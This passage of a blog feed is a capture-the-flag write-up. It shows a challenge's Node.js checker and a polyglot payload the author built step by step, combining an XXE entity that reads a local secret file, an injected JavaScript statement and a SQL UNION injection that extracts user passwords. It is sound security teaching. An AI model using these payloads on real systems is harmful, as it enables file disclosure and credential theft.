<span class="kr">const</span> <span class="nx">sanitizeHtml</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;sanitize-html&#34;</span><span class="p">)</span>

<span class="kd">function</span> <span class="nx">test_xxe</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">my_secret</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">).</span><span class="nx">substring</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s2">&#34;/home/gnx/script/xxe_secret&#34;</span><span class="p">,</span> <span class="nx">my_secret</span><span class="p">)</span>
        <span class="kd">var</span> <span class="nx">doc</span> <span class="o">=</span> <span class="nx">libxml</span><span class="p">.</span><span class="nx">parseXml</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="p">{</span> <span class="nx">noent</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">nonet</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>
        <span class="k">return</span> <span class="nx">doc</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">includes</span><span class="p">(</span><span class="nx">my_secret</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">false</span> <span class="p">}</span>
<span class="p">}</span>

<span class="nx">async</span> <span class="kd">function</span> <span class="nx">test_xss</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="kr">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
            <span class="nx">args</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;--no-sandbox&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-setuid-sandbox&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-dev-shm-usage&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-accelerated-2d-canvas&#39;</span><span class="p">,</span> <span class="s1">&#39;--no-first-run&#39;</span><span class="p">,</span> <span class="s1">&#39;--no-zygote&#39;</span><span class="p">,</span> <span class="s1">&#39;--single-process&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-gpu&#39;</span><span class="p">]</span>
        <span class="p">})</span>
        <span class="kr">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">()</span>
        <span class="nx">page</span><span class="p">.</span><span class="nx">setDefaultNavigationTimeout</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
        <span class="nx">payload</span> <span class="o">=</span> <span class="nx">sanitizeHtml</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="p">{</span> <span class="nx">allowedTags</span><span class="o">:</span> <span class="p">[]</span> <span class="p">})</span>
        <span class="nx">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="sb">`data:text/html,&lt;script&gt;</span><span class="si">${</span><span class="nx">payload</span><span class="si">}</span><span class="sb">&lt;/script&gt;`</span><span class="p">)</span>
        <span class="kr">const</span> <span class="nx">check</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="s2">&#34;( typeof xss != &#39;undefined&#39; ? true : false )&#34;</span><span class="p">)</span>
        <span class="c1">// vlw herrera
</span><span class="c1"></span>        <span class="nx">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
        <span class="k">return</span> <span class="nx">check</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">async</span> <span class="kd">function</span> <span class="nx">test_sqli</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
        <span class="nx">host</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_HOST</span> <span class="o">||</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>
        <span class="nx">user</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_USER</span><span class="p">,</span>
        <span class="nx">password</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_PASSWORD</span><span class="p">,</span>
        <span class="nx">database</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">MYSQL_DATABASE</span><span class="p">,</span>
        <span class="nx">charset</span><span class="o">:</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
        <span class="nx">dialectOptions</span><span class="o">:</span> <span class="p">{</span> <span class="nx">collate</span><span class="o">:</span> <span class="s1">&#39;utf8_general_ci&#39;</span><span class="p">,</span> <span class="p">},</span>
    <span class="p">})</span>
    <span class="kr">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">promisify</span><span class="p">(</span><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="nx">connection</span><span class="p">)</span>
    <span class="nx">connection</span><span class="p">.</span><span class="nx">connect</span><span class="p">()</span>
    <span class="kr">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;SELECT * from users&#34;</span><span class="p">)</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="kr">const</span> <span class="nx">sqli</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">query</span><span class="p">(</span><span class="sb">`SELECT * from posts where id=&#39;</span><span class="si">${</span><span class="nx">payload</span><span class="si">}</span><span class="sb">&#39;`</span><span class="p">)</span>
        <span class="nx">await</span> <span class="nx">connection</span><span class="p">.</span><span class="nx">end</span><span class="p">()</span>
        <span class="k">return</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">sqli</span><span class="p">).</span><span class="nx">includes</span><span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;password&#34;</span><span class="p">])</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">main</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xss</span> <span class="o">=</span> <span class="nx">test_xss</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="kd">var</span> <span class="nx">sqli</span> <span class="o">=</span> <span class="nx">test_sqli</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="kd">var</span> <span class="nx">xxe</span> <span class="o">=</span> <span class="nx">test_xxe</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">([</span><span class="nx">xss</span><span class="p">,</span> <span class="nx">sqli</span><span class="p">]).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">values</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">values</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">values</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">xxe</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;parabens hackudo&#34;</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;hack harder&#34;</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">}</span>
<span class="nx">main</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
</code></pre></div><p>I realized I&rsquo;d need something that parsed as valid js, valid sqli, and valid
xml, to some extent, which was the hardest part of the puzzle.</p>
<p>The xml attack was pretty easy to test locally and pretty easy to come up with.
As simple as this:</p>
<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span><span class="nt">&lt;r&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
</code></pre></div><p>Next, getting some validly parsing sql by ending the quote, and tacking
a comment on the end with <code>#</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span><span class="nt">&lt;r&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
<span class="c">&lt;!--&#39; union select password from users limit 1;#--&gt;</span>
</code></pre></div><p>It was a bit of a struggle to get the js to work (need to inject <code>xss=true;</code>), even with the assist of
sanitize-html. The sanitize-html call basically stripped out all of the xml
and comments, which was mostly helpful, so something like this almost works:</p>
<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span><span class="nt">&lt;r&gt;</span>;xss=true;//<span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
<span class="c">&lt;!--&#39; union select password from users limit 1;#--&gt;</span>
</code></pre></div><p>But you end up with something like: <code>]&gt;;xss=true;//&amp;xxe;</code> and the <code>];</code> doesn&rsquo;t
run.</p>
<p>I spent a while struggling with this piece, until a teammate suggested trying
another entity to inject a comment around the garbage:</p>
<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span>
<span class="cp">&lt;!ENTITY xxe2 SYSTEM &#34;xxe_seed&gt;</span>/*&#34;&gt;]&gt;<span class="nt">&lt;r&gt;</span>*/xss=true;//<span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
<span class="c">&lt;!--&#39; union select password from users;#--&gt;</span>
</code></pre></div><p>And the last piece was figuring out how many columns was in the posts table, so
we could match the union injection&ndash;took a few tries, but I just tacked on <code>,1</code>
until it ran and gave the flag. I think it was 4 columns, but don&rsquo;t remember at
this point. The <code>limit 1</code> isn&rsquo;t necessary but it seemed kind not to pull in the whole
table cartesian product ;) &ndash;the result was something like this:</p>
<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span>
<span class="cp">&lt;!ENTITY xxe2 SYSTEM &#34;xxe_seed&gt;</span>/*&#34;&gt;]&gt;<span class="nt">&lt;r&gt;</span>*/xss=true;//<span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
<span class="c">&lt;!--&#39; union select password, 1, 1, 1 from users limit 1;#--&gt;</span>
</code></pre></div><p>Note: it needs to be all on one line, but I broke it up for visibility.</p>
]]></content>
		</item>
		
	</channel>
</rss>
